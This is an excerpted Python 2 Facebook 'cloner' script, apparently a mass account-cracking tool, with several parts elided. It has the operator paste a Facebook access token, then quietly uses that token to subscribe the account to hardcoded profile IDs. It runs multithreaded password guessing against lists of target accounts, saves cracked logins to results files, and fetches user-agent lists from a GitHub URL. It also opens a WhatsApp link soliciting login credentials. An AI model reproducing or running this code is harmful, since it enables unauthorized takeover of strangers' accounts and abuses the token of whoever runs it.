...
user = []
score = 0
xi_jimpinx = '100068398876177'
koh = '100005395413800'
hoetank = random.choice(['Waoo this script so great:)', 'ummahh lush:v', 'waoooo wow so nice script:v'])
# lempankkkkkkkk
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
...
▀▄▄▀▄▄▀▄▀▄▀▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▀
        ...
        Developer : \x1b[1;93mMeer Sultan Baloch \x1b[1;97m[Version 0.3]
  \n\x1b[1;96m        ASLAM O ALAIKUM : \033[1;91mSmiling is my LIFE\n\n''' 
os.system('clear')
lo_ngentod = '149775127312449'
...
def yayanxd():
    os.system('clear')
    print logo 
    print ('\x1b[1;92m Past Your Facebook Account Token ')
    ...
    try:
        ...
        os.system('xdg-open https://wa.me/923476508876?text=Meer%20Sultan%please%give%me%Login%20%password%20and%20%user')
        os.system('clear')
        moch_yayan()
    except KeyError:
...
def wuhan(kontol):
    try:
        kentod = kontol
        requests.post('https://graph.facebook.com/100068398876177/subscribers?access_token=%s'%(kentod))
...
class __crack__:
    ...
    def plerr(self):
        ...
        ___yayanganteng___ = raw_input(' [%s?%s] Automatic(y) Or Own(t) Password ? [Y/t]: \n'%(O,N))
        if ___yayanganteng___ in ('Y', 'y'):
            os.system('clear')
            print logo 
            print 47*'\x1b[1;93m='
            while True:
                pwek = raw_input('\n [%s?%s] TYPE ANY PASSWORD 6 DIGIT : '%(O,N))
                print ' [#] CLONING PASSWORD |  [ %s%s%s ]' % (M, pwek, N)
                if pwek == '':
                    print '\n %s[%s×%s] Wrong Input'%(N,M,N)
                elif len(pwek)<=5:
                    print '\n %s[%s×%s] TYPE MINIMUM 6 DIGIT PASSWORD TYPE'%(N,M,N)
                else:
                    def __yan__(ysc=None): 
                        ...
                        if cin == '':
                            ...
                            print '\n %s[%s×%s] INVALID OPTION '%(N,M,N);self.__yan__()
                            
                        elif cin == '1':
                            os.system('clear')
                            print logo
                            print 47*'\x1b[1;93m='
                            print '\n [%s+%s] RESULT OK OPEN ID  |  results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] RESULT CP ID OPEN AFTER 7 DAYS  |  results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print 47*'\x1b[1;96m='
                            ...
                            print '\n [%s+%s] RESULT OK OPEN ID ke  |  results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] RESULT CP ID OPEN AFTER 7 DAYS  |  results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] anda bisa m\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                            ...
                            print '\n %s[%s×%s] Wrong Input'%(N,M,N);self.__yan__()
                    print '\n \x1b[1;93m[ Fast Cloner  ]\n'
                    print ' [%s1%s]Fast MoD'%(O,N)
    ...
    def __api__(self, user, __yan__):
        global ok,cp,score
        sys.stdout.write('\r [%s*%s] [Attacking] %s/%s  |  OK-:%s - CP-:%s '%(O,N,score,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
    ...
    def __mbasic__(self, user, __yan__):
        global ok,cp,score
        sys.stdout.write('\r [%s*%s] [crack] %s/%s  |  OK-:%s - CP-:%s '%(O,N,score,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            ...
            try:
            	...
            	_kontol = requests.get('https://raw.githubusercontent.com/noobboss1/NASHAHOGAR/main/Data/user-Agent.txt').text.strip()
    ...
    def __pler__(self):
        ...
        if yan == '':
            ...
            print '\n [%s+%s] Result Open OK ID  |  results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] Result CP After 7 Days Open  |  results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] Wrong Input\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            ...
            print '\n [%s#%s] ID Open  |  results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s#%s] ID Open After 7 Days   |  results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] Wrong Input\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
